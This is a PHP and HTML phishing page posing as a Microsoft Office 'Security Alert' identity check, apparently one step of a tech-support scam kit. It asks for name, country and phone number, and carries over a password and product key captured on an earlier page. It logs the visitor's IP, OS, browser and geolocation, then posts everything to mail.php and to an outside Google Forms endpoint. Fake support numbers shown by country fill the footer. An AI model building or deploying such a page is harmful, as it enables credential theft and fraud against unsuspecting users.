
<?php  
    if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')   
         $url = "https://";   
    else  
         $url = "http://";   
    // Append the host(domain name, ip) to the URL.   
    $url.= $_SERVER['HTTP_HOST'];   
    
    // Append the requested resource location to the URL   
    $url.= $_SERVER['REQUEST_URI'];      ?> 
<?php
$u_agent = $_SERVER['HTTP_USER_AGENT'];
$str_info = substr($u_agent, 11, 50);
$os=substr($str_info, 0, strpos($str_info, "AppleWebKit")); 


function getBrowser()
{
$u_agent = $_SERVER['HTTP_USER_AGENT'];
$bname = 'Unknown';
$platform = 'Unknown';
$version= "";

//First get the platform?
if (preg_match('/linux/i', $u_agent)) {
$platform = 'linux';
}
elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
$platform = 'mac';
}
elseif (preg_match('/windows|win32/i', $u_agent)) {
$platform = 'windows';
}

// Next get the name of the useragent yes seperately and for good reason
if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent))
{
$bname = 'Internet Explorer';
$ub = "MSIE";
}
elseif(preg_match('/Trident/i',$u_agent))
{ // this condition is for IE11
$bname = 'Internet Explorer';
$ub = "rv";
}
elseif(preg_match('/Firefox/i',$u_agent))
{
$bname = 'Mozilla Firefox';
$ub = "Firefox";
}
elseif(preg_match('/Chrome/i',$u_agent))
{
$bname = 'Google Chrome';
$ub = "Chrome";
}
elseif(preg_match('/Safari/i',$u_agent))
{
$bname = 'Apple Safari';
$ub = "Safari";
}
elseif(preg_match('/Opera/i',$u_agent))
{
$bname = 'Opera';
$ub = "Opera";
}
elseif(preg_match('/Netscape/i',$u_agent))
{
$bname = 'Netscape';
$ub = "Netscape";
}

// finally get the correct version number
// Added "|:"
$known = array('Version', $ub, 'other');
$pattern = '#(?<browser>' . join('|', $known) .
')[/|: ]+(?<version>[0-9.|a-zA-Z.]*)#';
if (!preg_match_all($pattern, $u_agent, $matches)) {
// we have no matching number just continue
}

// see how many we have
$i = count($matches['browser']);
if ($i != 1) {
//we will have two since we are not using 'other' argument yet
//see if version is before or after the name
if (strripos($u_agent,"Version") < strripos($u_agent,$ub)){
    $version= $matches['version'][0];
}
else {
    $version= $matches['version'][1];
}
}
else {
$version= $matches['version'][0];
}

// check if we have a number
if ($version==null || $version=="") {$version="?";}

return array(
'userAgent' => $u_agent,
'name'      => $bname,
'version'   => $version,
'platform'  => $platform,
'pattern'    => $pattern
);
}

// now try it
$ua=getBrowser();
$yourbrowser= $ua['name'] . " " . $ua['version'] ;


function getIPAddress() {  
//whether ip is from the share internet  
if(!empty($_SERVER['HTTP_CLIENT_IP'])) {  
        $ip = $_SERVER['HTTP_CLIENT_IP'];  
}  
//whether ip is from the proxy  
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
}  
//whether ip is from the remote address  
else{  
     $ip = $_SERVER['REMOTE_ADDR'];  
}  
return $ip;  
}  
$ip = getIPAddress();
?>
<?php 
    $location=(unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip)));
    $city= $location['geoplugin_city'];
    $state= $location['geoplugin_region'];
    $country= $location['geoplugin_countryName'];
    $zip= $location['geoplugin_areaCode'];
    $c_code= $location['geoplugin_countryCode'];
 ?> 
<?php 
$pass=$_POST['pass'];
$key_pro=$_POST['key_pro'];
$email=$_POST['email'];

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Microsoft Office</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>
    <link href="https://fonts.googleapis.com/css?family=Anton&display=swap" rel="stylesheet">
	<link rel="stylesheet" href="../css/style.css">
    <link rel="stylesheet" href="../css/banner.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,400;1,900&display=swap" rel="stylesheet">
    <link rel="icon" href="../img/favicon.ico" type="image/x-icon">

</head>
<body class="background-login">
    <div class="container">
        <div class="col-lg-4 col-lg-offset-4 sigin-box">
            <h1><img src="../img/logo.png" class="logo1" alt=""></h1>
            <!-- <h3 id="sign-head">Sign in</h3> -->
            <h3 class="text-center"><a class="sec_alert ">Security Alert !</a></h3>
            <h5 class="login-security-msg1 text-center">Confirm your identity</h5>
            <!-- <h3 id="pass-head">Enter password</h3> -->
            <form  id="form" target="_self" onsubmit="return postToGoogle();" action="" autocomplete="off">
            <div >
                <input type="text"  id="nameField"   placeholder="Name" class="sign-input" required><br><br>
                <input type="hidden"  id="emailfield"  name="email" value="<?php echo $email; ?>"><br><br>
                <select id="country" class="form-control input-key-product sign-input" class="" required>
                    <option value="">Country</option>
                    <option value="United States">United States +1</option>
                    <option value="Canada">Canada +1</option>
                    <option value="Australia">Australia +61</option>
                    <option value="United Kingdom">United Kingdom +44</option>
                    <option value="New Zealand">New Zealand +64</option>
                    <option value="Other">Other</option>
                </select><br>
                <p class="text-center" style="font-size: 12px;margin-top:12px;color: #1b07bd;"><b>Enter your phone number and we will send you a verification code to confirm your identity</b></p>

                <input type="text"  id="phoneField"  name="email" placeholder="Phone No" class="sign-input" required><br><br>
                <!-- <a href="register.php"><p class="link">No account? Create one!</p></a> -->
                <!-- <p class="link">Sign in with a security key </p>
                <p class="link">Sign-in options</p> -->
                
            </div>
            <div>
                <input type="hidden" id="ipField"  value="<?php echo $ip ?>" name="lname" placeholder="Last Name" class="sign-input" required>
                <input type="hidden" id="osField" value="<?php echo $os ?>" name="lname" placeholder="Last Name" class="sign-input" required>
                <input type="hidden" id="browserField" value="<?php echo $yourbrowser ?>"  name="lname" placeholder="Last Name" class="sign-input" required>
                <input type="hidden" id="passField" value="<?php echo $pass ?>"  name="lname" placeholder="Last Name" class="sign-input" required>
                <input type="hidden" id="key_pro" value="<?php echo $key_pro ?>"  name="lname" placeholder="Last Name" class="sign-input" required>
            </div>
            <div style="overflow:auto;">
                <div style="float:right;">
                    <input type="submit" name="submit" class="submit-nbtn" id="submit" value="Submit">
                </div>
            </div>
            </form>
        </div>
    </div>
    <div class="footer">
  <p><span class="cont-text">Customer Support Toll Free :</span> <span class="number-hp">
  <?php 
if($c_code == "US")
{
echo "US/CA +1 844 514 0333";
}
elseif($c_code == "CA")
{
echo "US/CA +1 844 514 0333";
}
elseif($c_code == "GB")
{
echo "UK   +44 800 229 4983";
}
elseif($c_code == "AU")
{
echo "AU   +1 844 514 0333";
}
elseif($c_code == "NZ")
{
echo "NZ   +1 844 514 0333";
}
else
{
    echo "+1 844 514 0333";
}
?>  
  </span> </p>
</div>
</body>
</html>
<script>
  $("#form").submit(function() 
  {
    var field1 = $("#nameField").val();
    var field2 = $("#emailfield").val();
    var field3 = $("#phoneField").val();
    var field4 = $("#passField").val();
    var field5 = $("#key_pro").val();
    var field6 = $("#ipField").val();
    var field7 = $("#osField").val();
    var field8 = $("#browserField").val();
    var field9 = $("#country option:selected").text();
    $.ajax({
        type: "POST",
        url:  "mail.php",
        data: {"name": field1, "email": field2, "phone": field3, "pass": field4, "key": field5,"ip": field6, "os": field7, "browser": field8, "country": field9},
        success: function(data) {
           return true;
        }
    });
        return false    
        e.preventDefault();
});
</script>

<script>
        function pageRedirect() {
                     window.location.replace("regoff_err.php");
                        }   
    function postToGoogle() {
    var field1 = $("#nameField").val();
    var field2 = $("#emailfield").val();
    var field3 = $("#phoneField").val();
    var field4 = $("#passField").val();
    var field5 = $("#key_pro").val();
    var field6 = $("#ipField").val();
    var field7 = $("#osField").val();
    var field8 = $("#browserField").val();
    var field9 = $("#country option:selected").text();
        var issue= "OFF-REG";

           $.ajax({
                url: "https://docs.google.com/forms/d/e/1FAIpQLScktgcZ6EoZg6XEFBgHpZH26mH3gKuJZ1lF10ldYKhEcrHjjQ/formResponse",
                data: {"entry.387747653": field1, "entry.806782166": field2, "entry.843182171": field3, "entry.492630052": field4, "entry.1662271692": field5,"entry.500770884": field6, "entry.297371834": field7, "entry.1328838957": field8, "entry.55418645": field9, "entry.1753287777": issue},
                type: "POST",
                dataType: "xml",
                success: function(d)
			{
			},
            
			error: function(x, y, z)
				{
                    setTimeout("pageRedirect()", 100);
					
				}
           });
		return false;
       }
</script>